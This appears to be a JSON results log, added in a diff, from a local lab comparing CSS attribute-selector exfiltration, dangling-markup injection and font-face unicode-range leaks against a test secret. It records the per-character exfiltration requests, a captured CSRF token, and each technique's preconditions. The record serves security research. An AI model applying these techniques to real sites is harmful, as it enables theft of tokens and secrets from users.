@@ -1,0 +1,180 @@
+{
+  "fecha": "2026-09-06T14:37:41.457Z",
+  "secretoReal": "S3cRet-XyZ7",
+  "cssExfil": {
+    "recuperado": "S3cRet-XyZ7",
+    "ok": true,
+    "rondas": [
+      {
+        "t": 1788705445974,
+        "path": "/collect",
+        "query": "?round=0&char=S&target=S",
+        "params": {
+          "round": "0",
+          "char": "S",
+          "target": "S"
+        }
+      },
+      {
+        "t": 1788705446926,
+        "path": "/collect",
+        "query": "?round=1&char=3&target=S3",
+        "params": {
+          "round": "1",
+          "char": "3",
+          "target": "S3"
+        }
+      },
+      {
+        "t": 1788705447863,
+        "path": "/collect",
+        "query": "?round=2&char=c&target=S3c",
+        "params": {
+          "round": "2",
+          "char": "c",
+          "target": "S3c"
+        }
+      },
+      {
+        "t": 1788705448790,
+        "path": "/collect",
+        "query": "?round=3&char=R&target=S3cR",
+        "params": {
+          "round": "3",
+          "char": "R",
+          "target": "S3cR"
+        }
+      },
+      {
+        "t": 1788705449722,
+        "path": "/collect",
+        "query": "?round=4&char=e&target=S3cRe",
+        "params": {
+          "round": "4",
+          "char": "e",
+          "target": "S3cRe"
+        }
+      },
+      {
+        "t": 1788705450659,
+        "path": "/collect",
+        "query": "?round=5&char=t&target=S3cRet",
+        "params": {
+          "round": "5",
+          "char": "t",
+          "target": "S3cRet"
+        }
+      },
+      {
+        "t": 1788705451587,
+        "path": "/collect",
+        "query": "?round=6&char=-&target=S3cRet-",
+        "params": {
+          "round": "6",
+          "char": "-",
+          "target": "S3cRet-"
+        }
+      },
+      {
+        "t": 1788705452515,
+        "path": "/collect",
+        "query": "?round=7&char=X&target=S3cRet-X",
+        "params": {
+          "round": "7",
+          "char": "X",
+          "target": "S3cRet-X"
+        }
+      },
+      {
+        "t": 1788705453447,
+        "path": "/collect",
+        "query": "?round=8&char=y&target=S3cRet-Xy",
+        "params": {
+          "round": "8",
+          "char": "y",
+          "target": "S3cRet-Xy"
+        }
+      },
+      {
+        "t": 1788705454379,
+        "path": "/collect",
+        "query": "?round=9&char=Z&target=S3cRet-XyZ",
+        "params": {
+          "round": "9",
+          "char": "Z",
+          "target": "S3cRet-XyZ"
+        }
+      },
+      {
+        "t": 1788705455313,
+        "path": "/collect",
+        "query": "?round=10&char=7&target=S3cRet-XyZ7",
+        "params": {
+          "round": "10",
+          "char": "7",
+          "target": "S3cRet-XyZ7"
+        }
+      },
+      {
+        "t": 1788705456245,
+        "path": "/collect",
+        "query": "?round=0&char=S&target=S",
+        "params": {
+          "round": "0",
+          "char": "S",
+          "target": "S"
+        }
+      }
+    ]
+  },
+  "dmi": {
+    "capturado": "?<meta name=\"csrf\" content=\"CSRF-TOKEN-S3cRet-XyZ7\">",
+    "ok": true,
+    "peticion": "/dmi?%3Cmeta%20name=%22csrf%22%20content=%22CSRF-TOKEN-S3cRet-XyZ7%22%3E"
+  },
+  "fontFace": {
+    "presentes": "-37RSXZcety",
+    "exfiltrados": "-37RSXZcety",
+    "hits": [
+      "S",
+      "-",
+      "7",
+      "3",
+      "Z",
+      "X",
+      "R",
+      "y",
+      "t",
+      "e",
+      "c"
+    ],
+    "ok": true
+  },
+  "comparacionSenalRuido": {
+    "css-atributos": {
+      "rondas": 11,
+      "peticionesUtiles": 11,
+      "reglasGeneradas": 737,
+      "tamanoMaxExfil": "ilimitado (posición a posición)",
+      "requiere": "secreto en ATRIBUTO con prefijo matcheable (value^=)",
+      "detecta": "orden exacto de los caracteres"
+    },
+    "font-face-unicode-range": {
+      "rondas": 1,
+      "peticionesUtiles": 11,
+      "reglasGeneradas": 67,
+      "tamanoMaxExfil": "conjunto de caracteres presentes (sin orden ni repetición)",
+      "requiere": "secreto renderizado como TEXTO con font-family controlable",
+      "detecta": "presencia de cada carácter (sin posición)"
+    },
+    "dmi": {
+      "rondas": 1,
+      "peticionesUtiles": 1,
+      "reglasGeneradas": 0,
+      "tamanoMaxExfil": "todo el HTML posterior hasta la siguiente comilla",
+      "requiere": "inyección de markup SIN cerrar antes del secreto",
+      "detecta": "el secreto completo en una petición"
+    }
+  },
+  "notas": "Lab 100% local (127.0.0.1:8101/8102/9244). No hubo interacción con ningún endpoint en scope."
+}
